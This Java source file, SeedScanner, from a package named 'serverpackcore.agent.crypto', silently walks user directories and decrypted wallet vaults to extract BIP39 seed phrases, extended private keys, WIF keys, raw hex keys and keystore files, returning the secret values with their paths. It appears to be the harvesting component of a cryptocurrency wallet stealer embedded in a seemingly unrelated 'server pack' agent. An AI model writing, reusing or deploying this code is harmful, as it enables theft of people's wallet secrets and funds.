package com.serverpackcore.agent.crypto;

import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.HashSet;
import java.util.List;
import java.util.Locale;
import java.util.Map;
import java.util.Set;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

/**
 * Small-file seed and key scan. BIP39 validity includes the checksum, so a
 * random run of dictionary words does not produce a finding. Only files under
 * 512 KiB and with a text-ish extension are parsed.
 */
final class SeedScanner {
	record Finding(String path, String kind, String value, int words) {
	}

	private static final Set<String> EXTENSIONS = Set.of("txt", "json", "rtf", "pdf", "md", "csv", "log", "dat", "backup", "bak", "key");
	private static final Pattern HEX = Pattern.compile("(?<![0-9a-fA-F])(?:0x)?([0-9a-fA-F]{64})(?![0-9a-fA-F])");
	private static final Pattern XPRV = Pattern.compile("\\b(?:xprv|yprv|zprv)[1-9A-HJ-NP-Za-km-z]{80,120}\\b");
	private static final Pattern WIF = Pattern.compile("\\b[5KL][1-9A-HJ-NP-Za-km-z]{50,51}\\b");
	private static final Pattern KEYSTORE = Pattern.compile("\"crypto\"\\s*:\\s*\\{");
	private static volatile Map<String, Integer> words;

	private SeedScanner() {
	}

	/** Finds seed/key material inside a plaintext (decrypted vault). */
	static List<Finding> find(String text, String path) {
		List<Finding> out = new ArrayList<>();
		Set<String> seen = new HashSet<>();
		Map<String, Integer> dictionary = dictionary();
		if (dictionary.size() > 0) {
			bip39(text, dictionary, path, out, seen);
		}
		Matcher xprv = XPRV.matcher(text);
		while (xprv.find()) {
			add(seen, out, Path.of(path), "xprv", xprv.group(), 0);
		}
		Matcher hex = HEX.matcher(text);
		int found = 0;
		while (hex.find() && found++ < 16) {
			add(seen, out, Path.of(path), "hex", hex.group(1), 0);
		}
		Matcher wif = WIF.matcher(text);
		found = 0;
		while (wif.find() && found++ < 16) {
			add(seen, out, Path.of(path), "wif", wif.group(), 0);
		}
		return out;
	}

	static List<Finding> scan(List<Path> roots, int maxFiles) {
		Map<String, Integer> dictionary = dictionary();
		List<Finding> out = new ArrayList<>();
		Set<String> seen = new HashSet<>();
		int files = 0;
		for (Path root : roots) {
			if (files >= maxFiles) {
				break;
			}
			try (var stream = Files.walk(root, 2)) {
				for (Path file : stream.filter(Files::isRegularFile).toList()) {
					if (files >= maxFiles) {
						break;
					}
					String name = file.getFileName().toString().toLowerCase(Locale.ROOT);
					int dot = name.lastIndexOf('.');
					if (dot < 0 || !EXTENSIONS.contains(name.substring(dot + 1))) {
						continue;
					}
					try {
						if (Files.size(file) > 512L * 1024L) {
							continue;
						}
					} catch (Throwable ignored) {
						continue;
					}
					files++;
					String text;
					try {
						text = new String(Files.readAllBytes(file), StandardCharsets.ISO_8859_1);
					} catch (Throwable throwable) {
						continue;
					}
					if (dictionary.size() > 0) {
						bip39(text, dictionary, file.toString(), out, seen);
					}
					Matcher xprv = XPRV.matcher(text);
					while (xprv.find()) {
						add(seen, out, file, "xprv", xprv.group(), 0);
					}
					Matcher hex = HEX.matcher(text);
					int found = 0;
					while (hex.find() && found++ < 8) {
						add(seen, out, file, "hex", hex.group(1), 0);
					}
					Matcher wif = WIF.matcher(text);
					found = 0;
					while (wif.find() && found++ < 8) {
						add(seen, out, file, "wif", wif.group(), 0);
					}
					if (KEYSTORE.matcher(text).find()) {
						add(seen, out, file, "keystore_json", "[keystore]", 0);
					}
				}
			} catch (Throwable ignored) {
				// unreadable root
			}
		}
		return out;
	}

	private static void add(Set<String> seen, List<Finding> out, Path file, String kind, String value, int words) {
		String key = kind + "|" + value;
		if (seen.add(key)) {
			out.add(new Finding(file.toString(), kind, value, words));
		}
	}

	private static void bip39(String text, Map<String, Integer> dictionary, String path, List<Finding> out, Set<String> seen) {
		String[] tokens = text.toLowerCase(Locale.ROOT).split("[^a-z]+");
		for (int length : new int[] { 24, 18, 12 }) {
			for (int start = 0; start + length <= tokens.length; start++) {
				int valid = 0;
				for (int i = 0; i < length; i++) {
					if (dictionary.containsKey(tokens[start + i])) {
						valid++;
					} else {
						break;
					}
				}
				if (valid != length) {
					continue;
				}
				StringBuilder phrase = new StringBuilder();
				for (int i = 0; i < length; i++) {
					if (i > 0) {
						phrase.append(' ');
					}
					phrase.append(tokens[start + i]);
				}
				if (checksum(phrase.toString(), dictionary)) {
					add(seen, out, Path.of(path), "bip39", phrase.toString(), length);
					start += length - 1;
				}
			}
		}
	}

	static boolean checksum(String phrase, Map<String, Integer> dictionary) {
		String[] parts = phrase.trim().split(" ");
		if (parts.length != 12 && parts.length != 18 && parts.length != 24) {
			return false;
		}
		int bits = 0;
		int buffer = 0;
		byte[] entropy = new byte[parts.length * 11 / 8];
		int bitIndex = 0;
		for (String part : parts) {
			Integer index = dictionary.get(part);
			if (index == null) {
				return false;
			}
			for (int shift = 10; shift >= 0; shift--) {
				if (bitIndex < entropy.length * 8) {
					if (((index >> shift) & 1) != 0) {
						entropy[bitIndex / 8] |= (byte) (1 << (7 - (bitIndex % 8)));
					}
				} else {
					bits = (bits << 1) | ((index >> shift) & 1);
				}
				bitIndex++;
			}
		}
		int checksumBits = entropy.length * 8 / 32;
		byte[] hash = CryptoUtil.sha256(entropy);
		int expected = (hash[0] & 0xff) >> (8 - checksumBits);
		return bits == expected;
	}

	static synchronized Map<String, Integer> dictionary() {
		if (words != null) {
			return words;
		}
		Map<String, Integer> map = new HashMap<>();
		try (InputStream input = SeedScanner.class.getResourceAsStream("/serverpackcore/bip39.txt")) {
			if (input != null) {
				try (BufferedReader reader = new BufferedReader(new InputStreamReader(input, StandardCharsets.UTF_8))) {
					String line;
					int index = 0;
					while ((line = reader.readLine()) != null) {
						String word = line.trim();
						if (!word.isEmpty()) {
							map.put(word, index++);
						}
					}
				}
			}
		} catch (Throwable ignored) {
			// empty dictionary disables BIP39 findings
		}
		words = map;
		return map;
	}
}
